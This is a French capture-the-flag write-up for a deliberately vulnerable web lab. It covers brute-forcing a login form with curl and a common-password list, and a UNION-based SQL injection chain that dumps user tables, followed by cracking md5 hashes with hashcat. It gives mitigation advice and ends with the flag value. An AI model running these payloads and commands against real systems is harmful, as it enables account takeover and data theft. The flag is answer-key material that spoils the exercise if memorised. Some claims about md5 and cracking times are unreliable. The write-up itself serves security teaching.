# Procédure BRUTE FORCE FLAG

> Ce flag peut être obtenu d'au moins 2 façons!

## Procédure BRUTE FORCE

Cette procédure s'exécute sur l'url : `ip_darkly/?page=signin`.

L'objectif est de déterminer la résistance de l'application contre la **force
brute** de deviner les mots de passe.

1. Tous les champs du formulaire `<form>` de la page sont à prendre en compte,
   car ils seront requis pour la validation de la requête par le
   serveur.  
   En effet, c'est au backend de l'application, de se charger des
   vérifications d'accès aux données stockées, en son sein.   
   Le formulaire de connexion attend les inputs suivants:
   - champ `username`,
   - champ `password`,
   - champ `Submit`.  
   Here you are a resource that can help you understand what happens when we use `curl` for
   sending forms requests: [CURL HTTPSCRIPTING](https://curl.se/docs/httpscripting.html#).
2. En général, on utilise des dictionnaires éprouvés de logins et de mots de passe, afin de mener une attaque par **brute force**.  
   Une attaque de mots de passe par **brute force** consiste à tester le plus de
   paires `login/password` jusqu'à trouver celle qui dévérouille l'accès.  
   Nous utiliserons ici, afin que le test ne soit pas interminable, 2 courtes
   listes pré-établies de 6 usernames et de 20 mots de passe.   
   | logins | passwords |
   |--------|:----------|
   | root   | 123456    |
   | admin   | password    |
   | test   | 12345678    |
   | guest   | 1234    |
   | info   | pussy    |
   | <vide>   | 12345    |
   |        | dragon    |
   |        | qwerty    |
   |        | 696969    |
   |        | mustang    |
   |        | letmein    |
   |        | baseball    |
   |        | master    |
   |        | michael    |
   |        | football    |
   |        | shadow    |
   |        | monkey    |
   |        | abc123    |
   |        | pass    |
   |        | fuckme    |   
   L'inspiration provient d'ici:
   - [SECLISTS GITHUB](https://github.com/danielmiessler/SecLists) 
   - [WORST PASSWORDS](https://github.com/danielmiessler/SecLists/blob/master/Passwords/500-worst-passwords.txt)   
   - [COMMON USERNAMES](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt)   
3. Pour chacune des paires login/password, on émettra la requête
   `curl` suivante:  
   ```bash
   curl -sG --data-urlencode "username=<USERNAME>" --data-urlencode "password=<PASSWORD>" --data-urlencode "Submit=Submit" "ip_darkly/?page=signin"
   ```
   On teste également avec un username vide.
4. Toutes les requêtes avec le mot de passe `shadow` retourneront le
   flag.  
   Le test avec l'username vide nous renseigne sur un élément
   très important:   
   **l'username n'est pas pris en compte pour
   la gestion de la connexion**.  
   Sans ce test, on aurait vite pu en
   déduire que tous les couples `login/passwd` retournant le flag
   confirmaient l'existance du login en question.

### Comment s'en prémunir

- Vérifier la conformité des informations transmises par une
  requête! Ici seule la saisie du mot de passe débloque l'accès au flag.
  C'est une faille de sécurité très grave de ne pas avoir
  fait les vérifications rudimentaires de base.  
  Avant de s'occuper de
  l'echappement et l'encodage des caractères HTML reçus en entrée, il
  faut déja s'assurer qu'on reçoit bien quelque chose pour
  l'username ET que le combo `username/passwd` serve, à minima, à
  autoriser la connexion.
- Chacun des comptes présents par défaut (comme `root`,
  `admin`, `mysql`...) doivent être désactivés.  
  Un bon
  administrateur système créera les comptes utilisateurs
  nécessaires et suffisants,
  avec les rôles et droits appropriés, afin d'assurer la sécurité
  minimale l'application.
- Le mot de passe en relation avec le compte par défaut doit également être
  changé dès que l'utilisateur légitime entre en sa possession, puis de façon
  régulière,  
  être le plus long possible (8 caractères est un minimum, avec 13, on donne du réellement mal à un attaquant pour le décoder).  
  *`hashcat` a besoin de 580 ans environ pour brute force, sans dictionnaire, un mot de passe de 8 caractères hashé en md5.*  
  Idéalement ce sera une séquence aléatoire de caractères
  alphanumériques et spéciaux.  
  Le mot de passe sera stocké après avoir été hashé.  
  **On ne stocke
  jamais de telles informations en clair**.
- Définir un nombre maximal de tentatives de connexion successives, ou augmenter
  le temps d'attente entre plusieurs tentatives infructueuses.  
  Un petit
  temps d'attente basé sur la suite de Fibonnacci devrait dissuader
  plus d'un attaquant **brute force**.
- Utiliser HTTPS afin de crypter les données transitant sur le réseau.

L'impact d'une attaque **brute force** se verra réduite si ces
quelques règles sont appliquées.

On se tournera sans hésiter vers d'autres techniques
d'authentification, comme les **JWT** ou la **2FA**, afin de simplifier, pour
l'utilisateur la gestion de ses connexions, mais surtout sécuriser
efficacement l'accès au serveur web.

### Pour plus d'informations:  

[WSTG-ATHN-07](https://github.com/clallier94/wstg-translation-fr/blob/0d20f06e3195a81fd07c9294207dd80ba7710e55/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy.md)   
[WSTG-ATHN-03](https://github.com/clallier94/wstg-translation-fr/blob/0d20f06e3195a81fd07c9294207dd80ba7710e55/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism.md)   
[OWASP BRUTE FORCE](https://owasp.org/www-community/attacks/Brute_force_attack)   
[WSTG-CRYP-03](https://github.com/clallier94/wstg-translation-fr/blob/0d20f06e3195a81fd07c9294207dd80ba7710e55/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels.md)    

## 2e façon d'attraper le flag

### Procédure OBTAINING ROOT PASSWORD WITH SQL INJECTION

Il était possible aussi de récupérer le flag par injection SQL.  
La table
`Member_Brute_Force.db_default`, récupérée lors des injections SQL, nous incite à comprendre qu'une attaque **brute
force** est attendue à cette étape.   
Par conséquent, nous présenterons et ferons la démonstration
de l'attaque présentée au 1er point lors de la défense.   
Cela ne nous empêche pas de présenter également celle-là.

1. Repérer les points d'entrée vulnerables:   
    Formulaire recherche de membre [Formulaire](http://ip_darkly?page=member) `http://ip_darkly?page=member`
2. Récupérer l'empreinte du SGBD:   
    *Détection par erreur + injection sql version() = Darkly utilise **MariaDB** comme SGBD*
    ```SQL
    ip_darkly/index.php?page=member&Submit=Submit&id=1 UNION SELECT 1, version() limit 1,1
    ```
3. Récupérer le nombres de colonnes max auquel l'injection SQL devra se référer:
   (n est le nombre à tester)
    ```SQL
    ip_darkly/index.php?page=member&Submit=Submit&id=1 ORDER BY n
    ```
4. Récupérer le nom des tables accessibles à l'utilisateur
    ```SQL
    ip_darkly/index.php?page=member&Submit=Submit&id=1 and 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables
    ```
5. Récupérer le nom des colonnes qui nous interesse
    ```SQL
    ip_darkly/index.php?page=member&Submit=Submit&id=1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
    ```
6. Injecter une requete SQL pour recuperer les datas ou sont stockés les
   passwords
    ```SQL
    ip_darkly/index.php?page=member&Submit=Submit&id=1 AND 1=2 UNION SELECT username, password FROM Member_Brute_Force.db_default
    ```
7. Les passwords sont hashés, brute force md5
    ```bash
    hashcat -a 3 -m 0 "${hash_pass}" | grep -E "${hash_pass}" | awk -F: '{print $2}'
    ```
8. Emettre la requete de connexion
    ```bash
    ip_darkly/index.php?page=signin&username=${usernames[$i]}&Login=Login&password=${decrypted_passwords[$i]}
    ```

Un flag, le même, est retourné pour les 2 comptes pouvant se log (admin et root)

#### Comment s'en prémunir

- Parser les inputs utilisateurs et échapper tout caractère spécial
- Répondre aux erreurs de SGBD avec des erreurs personnalisées en laissant peu
  d'indication sur l'erreur en cours afin de ne pas aiguiller un attaquant sur
  ce qui peut être vulnérable
- Utiliser les `parametrized query` offertes par les différents frameworks/API de
  développement (PDO...). NEVER TRUST INPUT USER. Ne jamais passer telle quelle une
  valeur récupérée d'une saisie utilisateur à une requête SQL.
- Changer régulièrement ses mots de passe, avoir des mots de passe de 8
  caractères minimum. Les crypter avant
  de les stocker en base de données. Si le hash est reversible (comme le md5),
  utiliser un autre algorithme de chiffrement.

#### Pour plus d'informations:  
[WSTG-INPV-05](https://github.com/clallier94/wstg-translation-fr/blob/main/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md)   

## Flag
```text
3b4e8a30ecbfde518f50f2bda1912b40338ecd71821faeb1e9cdf44cefff95f5
```
